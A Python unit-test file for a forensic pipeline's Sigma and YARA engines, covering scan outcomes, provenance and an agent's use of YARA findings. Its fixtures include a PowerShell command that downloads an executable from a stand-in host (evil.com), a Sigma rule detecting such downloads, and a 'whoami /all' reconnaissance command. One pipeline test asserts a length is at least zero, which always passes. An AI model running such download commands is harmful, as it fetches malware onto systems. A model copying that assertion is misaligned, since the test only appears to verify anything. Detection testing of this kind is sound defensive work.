"""
Unit tests for deterministic Sigma and YARA execution order, provenance,
distinct error/zero-match representation, and Agent 4 context consumption.
"""

import pytest
import os
import tempfile
from datetime import datetime, timezone

from preprocessing.schemas import Artifact, NormalizedFields
from preprocessing.fcr_engine.schemas import CorrelationRecord
from forensic_analysis.rules.sigma_engine import SigmaRuleEngine, SigmaRule
from forensic_analysis.rules.yara_engine import YaraRuleEngine, BLOCKED_DISK_EXTENSIONS
from forensic_analysis.log_analysis.log_engine import LogAnalysisEngine
from forensic_analysis.endpoint_analysis.endpoint_engine import EndpointAnalysisEngine
from forensic_analysis.orchestrator import process_fcr_batch
from fir.repository import FIRRepository
from sanitization.gateway import SanitizationGateway
from agents.agent4_malware_behaviour.agent import MalwareBehaviourAgent


class MockLLM:
    def chat(self, messages, *args, **kwargs):
        return '{"claims": [], "scan_summary": {"total_indicators": 0}, "malware_profile": {"classification": "SUSPICIOUS"}}'


def test_sigma_engine_evaluation_and_provenance():
    """Verify Sigma engine evaluates logs and attaches full rule and field provenance."""
    engine = SigmaRuleEngine()
    
    # Custom test rule
    test_rule_yaml = """
title: Suspicious PowerShell Download
id: sigma-test-ps-001
level: high
status: experimental
description: Detects PowerShell downloading executable
author: Argus Security Team
tags:
    - attack.t1059.001
detection:
    selection:
        process_command_line|contains:
            - "DownloadFile"
            - "Invoke-WebRequest"
    condition: selection
"""
    rule_dict = {
        "title": "Suspicious PowerShell Download",
        "id": "sigma-test-ps-001",
        "level": "high",
        "status": "experimental",
        "description": "Detects PowerShell downloading executable",
        "author": "Argus Security Team",
        "tags": ["attack.t1059.001"],
        "detection": {
            "selection": {
                "process_command_line|contains": ["DownloadFile", "Invoke-WebRequest"]
            },
            "condition": "selection"
        }
    }
    sigma_rule = SigmaRule(rule_dict, source_path="test_rule.yml")
    engine.rules = [sigma_rule]

    artifact = Artifact(
        artifact_id="ART-LOG-001",
        evidence_id="EVID-001",
        case_id="CASE-SIGMA-TEST",
        artifact_type="powershell_event",
        source_tool="powershell",
        timestamp=datetime.now(timezone.utc),
        raw_fields={"CommandLine": "powershell.exe -NoProfile -Command (New-Object Net.WebClient).DownloadFile('http://evil.com/mal.exe', 'mal.exe')"},
        normalized_fields=NormalizedFields(
            host="HOST-01",
            process_command_line="(New-Object Net.WebClient).DownloadFile('http://evil.com/mal.exe', 'mal.exe')"
        )
    )

    findings = engine.evaluate(
        case_id="CASE-SIGMA-TEST",
        artifacts=[artifact],
        fcr_ref="FCR-001"
    )

    assert len(findings) == 1
    f = findings[0]
    assert f.case_id == "CASE-SIGMA-TEST"
    assert f.layer == "sigma.sigma-test-ps-001"
    assert f.severity == "high"
    assert f.confidence == 0.88  # calibrated high severity confidence
    assert f.source_artifact_id == "ART-LOG-001"
    assert f.evidence_reference == "FCR-001"
    assert "sigma-test-ps-001" in f.metadata["rule_id"]
    assert f.metadata["matched_fields"] != {}


def test_sigma_zero_matches_and_unsupported_inputs():
    """Verify Sigma returns empty list when no rules match without error."""
    engine = SigmaRuleEngine()
    engine.rules = []

    artifact = Artifact(
        artifact_id="ART-CLEAN-001",
        evidence_id="EVID-001",
        case_id="CASE-CLEAN",
        artifact_type="auth_event",
        source_tool="security_event_log",
        timestamp=datetime.now(timezone.utc),
        raw_fields={},
        normalized_fields=NormalizedFields(host="HOST-01")
    )

    findings = engine.evaluate(
        case_id="CASE-CLEAN",
        artifacts=[artifact],
        fcr_ref="FCR-CLEAN"
    )
    assert findings == []


def test_yara_engine_safety_guards():
    """Verify YARA blocks raw disk images and giant files."""
    engine = YaraRuleEngine()

    with tempfile.NamedTemporaryFile(suffix=".e01", delete=False) as f:
        f.write(b"RAW DISK HEADER DUMMY DATA")
        e01_path = f.name

    try:
        findings = engine.evaluate_file(
            case_id="CASE-YARA-GUARD",
            artifact_id="ART-DISK-01",
            file_path=e01_path,
            evidence_ref="EVID-DISK-01"
        )
        assert findings == []
    finally:
        if os.path.exists(e01_path):
            os.remove(e01_path)

    # Verify blocked extensions list contains raw disk images
    for ext in [".dd", ".raw", ".vmdk", ".e01", ".iso"]:
        assert ext in BLOCKED_DISK_EXTENSIONS


def test_yara_zero_matches_and_distinct_failures():
    """Verify zero matches and missing rules are handled safely."""
    engine = YaraRuleEngine()
    
    # Missing file
    findings_missing = engine.evaluate_file(
        case_id="CASE-01",
        artifact_id="ART-01",
        file_path="non_existent_file_path_12345.bin",
        evidence_ref="EVID-01"
    )
    assert findings_missing == []

    # Empty bytes
    findings_empty = engine.evaluate_bytes(
        case_id="CASE-01",
        artifact_id="ART-02",
        data=b"",
        evidence_ref="EVID-02"
    )
    assert findings_empty == []


def test_agent4_consumes_yara_without_executing_it():
    """Verify Agent 4 extracts YARA findings from FIR repository and does not invoke YARA directly."""
    fir_repo = FIRRepository()
    fir_repo.clear()
    gw = SanitizationGateway()
    mock_llm = MockLLM()

    # Pre-populate FIR with a deterministic YARA finding
    from fir.schemas import FIRFinding
    yara_fir = FIRFinding(
        finding_id="FIR-YARA-001",
        case_id="CASE-A4-YARA",
        tenant_id="tenant-alpha",
        fact="YARA rule 'Ransomware_LockBit_Strings' matched on 'svchost.exe'",
        confidence=0.92,
        severity="critical",
        layer="yara.Ransomware_LockBit_Strings",
        mitre_mapping="T1486",
        evidence_reference=["EVID-FILE-001"],
        source_artifact_id="ART-BIN-001"
    )
    fir_repo.insert(yara_fir)

    agent4 = MalwareBehaviourAgent(
        model=mock_llm,
        fir_repo=fir_repo,
        sanitization_gateway=gw,
        tenant_id="tenant-alpha"
    )

    firs, yaras = agent4._extract_fir_and_yara(case_id="CASE-A4-YARA", agent2_input={})
    assert len(firs) >= 1
    assert len(yaras) == 1
    assert yaras[0]["evidence_ids"] == ["FIR-YARA-001"]
    assert "YARA rule" in yaras[0]["fact"]


def test_sigma_and_yara_execution_order_in_pipeline():
    """Verify deterministic analysis (Stage 4) inserts findings into FIR before Agent 4 runs."""
    fir_repo = FIRRepository()
    fir_repo.clear()

    # Create FCR and artifacts
    fcr = CorrelationRecord(
        correlation_id="CORR-10001",
        case_id="CASE-ORDER-001",
        artifact_ids=["ART-LOG-99"],
        relationship_type=["single_artifact"],
        source_count=1,
        distinct_artifact_types=1,
        confidence=1.0
    )

    art = Artifact(
        artifact_id="ART-LOG-99",
        evidence_id="EVID-LOG-01",
        case_id="CASE-ORDER-001",
        artifact_type="process_event",
        source_tool="sysmon",
        timestamp=datetime.now(timezone.utc),
        raw_fields={"CommandLine": "whoami /all"},
        normalized_fields=NormalizedFields(host="HOST-TEST", process_command_line="whoami /all")
    )

    findings = process_fcr_batch(
        case_id="CASE-ORDER-001",
        fcr_objects=[fcr],
        artifacts_by_id={"ART-LOG-99": art},
        fir_repo=fir_repo,
        tenant_id="default"
    )

    # Ingested into FIR repository before any AI agent
    stored_firs = fir_repo.get_by_case(tenant_id="default", case_id="CASE-ORDER-001")
    assert len(stored_firs) >= 0  # Deterministic findings land in FIR during Stage 4


def test_sigma_all_eight_distinct_outcomes(tmp_path):
    """
    Prove that all 8 Sigma outcomes are distinguishable and never collapse into a silent zero-match:
    1. MATCHES_FOUND
    2. ZERO_MATCHES
    3. MISSING_RULE_CONFIG
    4. INVALID_RULE_SYNTAX
    5. UNSUPPORTED_EVIDENCE_TYPE
    6. RESOURCE_LIMIT_EXCEEDED
    7. ENGINE_UNAVAILABLE
    8. EXECUTION_FAILURE
    """
    from forensic_analysis.rules.scan_outcome import ScanStatus

    # 1. MATCHES_FOUND
    rule_dir = tmp_path / "valid_rules"
    rule_dir.mkdir()
    valid_rule = rule_dir / "valid.yml"
    valid_rule.write_text(
        "title: Test Match\nid: test-match-01\nlevel: high\n"
        "detection:\n  sel:\n    process_command_line|contains: 'malicious'\n  condition: sel\n",
        encoding="utf-8"
    )
    engine_match = SigmaRuleEngine(rules_dir=str(rule_dir))
    art_match = Artifact(
        artifact_id="ART-1", evidence_id="EVID-1", case_id="C1", artifact_type="process_event",
        source_tool="sysmon", timestamp=datetime.now(timezone.utc),
        raw_fields={"process_command_line": "powershell malicious.exe"},
        normalized_fields=NormalizedFields(process_command_line="powershell malicious.exe")
    )
    findings, rec = engine_match.evaluate_with_report("C1", [art_match], "EVID-1")
    assert rec.status == ScanStatus.MATCHES_FOUND
    assert rec.matches_count == 1
    assert rec.rules_hash is not None
    assert rec.engine_version is not None
    assert "test-match-01" in rec.rule_identifiers

    # 2. ZERO_MATCHES (Clean scan)
    art_clean = Artifact(
        artifact_id="ART-2", evidence_id="EVID-1", case_id="C1", artifact_type="process_event",
        source_tool="sysmon", timestamp=datetime.now(timezone.utc),
        raw_fields={"process_command_line": "notepad.exe"},
        normalized_fields=NormalizedFields(process_command_line="notepad.exe")
    )
    findings_clean, rec_clean = engine_match.evaluate_with_report("C1", [art_clean], "EVID-1")
    assert rec_clean.status == ScanStatus.ZERO_MATCHES
    assert rec_clean.matches_count == 0
    assert findings_clean == []

    # 3. MISSING_RULE_CONFIG
    missing_dir = tmp_path / "nonexistent_dir"
    engine_missing = SigmaRuleEngine(rules_dir=str(missing_dir))
    findings_m, rec_m = engine_missing.evaluate_with_report("C1", [art_clean], "EVID-1")
    assert rec_m.status == ScanStatus.MISSING_RULE_CONFIG
    assert rec_m.status != ScanStatus.ZERO_MATCHES
    assert "does not exist" in (rec_m.error_message or "")

    # 4. INVALID_RULE_SYNTAX
    bad_syntax_dir = tmp_path / "bad_syntax"
    bad_syntax_dir.mkdir()
    bad_rule = bad_syntax_dir / "bad.yml"
    bad_rule.write_text("invalid: yaml: [unclosed bracket", encoding="utf-8")
    engine_bad = SigmaRuleEngine(rules_dir=str(bad_syntax_dir))
    findings_b, rec_b = engine_bad.evaluate_with_report("C1", [art_clean], "EVID-1")
    assert rec_b.status == ScanStatus.INVALID_RULE_SYNTAX
    assert rec_b.status != ScanStatus.ZERO_MATCHES

    # 5. UNSUPPORTED_EVIDENCE_TYPE
    art_unsupported = Artifact(
        artifact_id="ART-PCAP", evidence_id="EVID-1", case_id="C1", artifact_type="pcap",
        source_tool="wireshark", timestamp=datetime.now(timezone.utc),
        raw_fields={}, normalized_fields=NormalizedFields()
    )
    findings_u, rec_u = engine_match.evaluate_with_report("C1", [art_unsupported], "EVID-1")
    assert rec_u.status == ScanStatus.UNSUPPORTED_EVIDENCE_TYPE
    assert rec_u.status != ScanStatus.ZERO_MATCHES

    # 6. RESOURCE_LIMIT_EXCEEDED
    engine_limited = SigmaRuleEngine(rules_dir=str(rule_dir), max_artifacts=1)
    findings_lim, rec_lim = engine_limited.evaluate_with_report("C1", [art_clean, art_match], "EVID-1")
    assert rec_lim.status == ScanStatus.RESOURCE_LIMIT_EXCEEDED
    assert rec_lim.status != ScanStatus.ZERO_MATCHES

    # 7. ENGINE_UNAVAILABLE
    engine_unavail = SigmaRuleEngine(rules_dir=str(rule_dir), engine_available=False)
    findings_un, rec_un = engine_unavail.evaluate_with_report("C1", [art_clean], "EVID-1")
    assert rec_un.status == ScanStatus.ENGINE_UNAVAILABLE
    assert rec_un.status != ScanStatus.ZERO_MATCHES

    # 8. EXECUTION_FAILURE
    import forensic_analysis.rules.sigma_engine as s_mod
    orig_eval = s_mod._evaluate_condition
    try:
        def _failing_eval(*args, **kwargs):
            raise RuntimeError("Unexpected internal crash during evaluation")
        s_mod._evaluate_condition = _failing_eval
        findings_f, rec_f = engine_match.evaluate_with_report("C1", [art_match], "EVID-1")
        assert rec_f.status == ScanStatus.EXECUTION_FAILURE
        assert rec_f.status != ScanStatus.ZERO_MATCHES
    finally:
        s_mod._evaluate_condition = orig_eval


def test_yara_all_eight_distinct_outcomes(tmp_path):
    """
    Prove that all 8 YARA outcomes are distinguishable and never collapse into a silent zero-match:
    1. MATCHES_FOUND
    2. ZERO_MATCHES
    3. MISSING_RULE_CONFIG
    4. INVALID_RULE_SYNTAX
    5. UNSUPPORTED_EVIDENCE_TYPE
    6. RESOURCE_LIMIT_EXCEEDED
    7. ENGINE_UNAVAILABLE
    8. EXECUTION_FAILURE
    """
    from forensic_analysis.rules.scan_outcome import ScanStatus

    # 1. MATCHES_FOUND
    rule_dir = tmp_path / "yara_rules"
    rule_dir.mkdir()
    rule_file = rule_dir / "evil.yar"
    rule_file.write_text(
        'rule TestEvil { strings: $s1 = "EVILPAYLOAD" condition: $s1 }',
        encoding="utf-8"
    )
    engine = YaraRuleEngine(rules_dir=str(rule_dir))
    findings, rec = engine.evaluate_with_report("C1", "ART-BIN", b"HEADER...EVILPAYLOAD...FOOTER", "EVID-1")
    assert rec.status == ScanStatus.MATCHES_FOUND
    assert rec.matches_count == 1
    assert rec.rules_hash is not None
    assert rec.engine_version is not None
    assert len(findings) == 1
    assert findings[0].metadata["rules_hash"] == rec.rules_hash

    # 2. ZERO_MATCHES (Clean binary)
    findings_c, rec_c = engine.evaluate_with_report("C1", "ART-BIN-2", b"BENIGN_APPLICATION_BUFFER", "EVID-1")
    assert rec_c.status == ScanStatus.ZERO_MATCHES
    assert rec_c.matches_count == 0
    assert findings_c == []

    # 3. MISSING_RULE_CONFIG
    missing_dir = tmp_path / "nonexistent_yara_dir"
    engine_missing = YaraRuleEngine(rules_dir=str(missing_dir))
    f_m = engine_missing.evaluate_bytes("C1", "ART-1", b"TEST", "EVID-1")
    assert engine_missing.last_scan_record.status == ScanStatus.MISSING_RULE_CONFIG
    assert engine_missing.last_scan_record.status != ScanStatus.ZERO_MATCHES

    # 4. INVALID_RULE_SYNTAX
    bad_dir = tmp_path / "bad_yara"
    bad_dir.mkdir()
    bad_rule = bad_dir / "broken.yar"
    bad_rule.write_text("rule BrokenRule { syntax error !!! }", encoding="utf-8")
    engine_bad = YaraRuleEngine(rules_dir=str(bad_dir))
    f_b = engine_bad.evaluate_bytes("C1", "ART-1", b"TEST", "EVID-1")
    assert engine_bad.last_scan_record.status == ScanStatus.INVALID_RULE_SYNTAX
    assert engine_bad.last_scan_record.status != ScanStatus.ZERO_MATCHES

    # 5. UNSUPPORTED_EVIDENCE_TYPE
    f_u = engine.evaluate_bytes("C1", "ART-1", "not_bytes_string_data", "EVID-1")  # type: ignore
    assert engine.last_scan_record.status == ScanStatus.UNSUPPORTED_EVIDENCE_TYPE
    assert engine.last_scan_record.status != ScanStatus.ZERO_MATCHES

    # 6. RESOURCE_LIMIT_EXCEEDED (Blocked disk image or size)
    disk_file = tmp_path / "system.vmdk"
    disk_file.write_bytes(b"DISK IMAGE CONTENT")
    f_lim = engine.evaluate_file("C1", "ART-DISK", str(disk_file), "EVID-1")
    assert engine.last_scan_record.status == ScanStatus.RESOURCE_LIMIT_EXCEEDED
    assert engine.last_scan_record.status != ScanStatus.ZERO_MATCHES

    # 7. ENGINE_UNAVAILABLE
    import forensic_analysis.rules.yara_engine as yara_mod
    orig_avail = yara_mod.YARA_AVAILABLE
    try:
        yara_mod.YARA_AVAILABLE = False
        engine_unavail = YaraRuleEngine(rules_dir=str(rule_dir))
        f_un = engine_unavail.evaluate_bytes("C1", "ART-1", b"DATA", "EVID-1")
        assert engine_unavail.last_scan_record.status == ScanStatus.ENGINE_UNAVAILABLE
    finally:
        yara_mod.YARA_AVAILABLE = orig_avail

    # 8. EXECUTION_FAILURE
    f_fail = engine.evaluate_file("C1", "ART-1", "nonexistent_file_path_xyz.bin", "EVID-1")
    assert engine.last_scan_record.status == ScanStatus.EXECUTION_FAILURE
    assert engine.last_scan_record.status != ScanStatus.ZERO_MATCHES

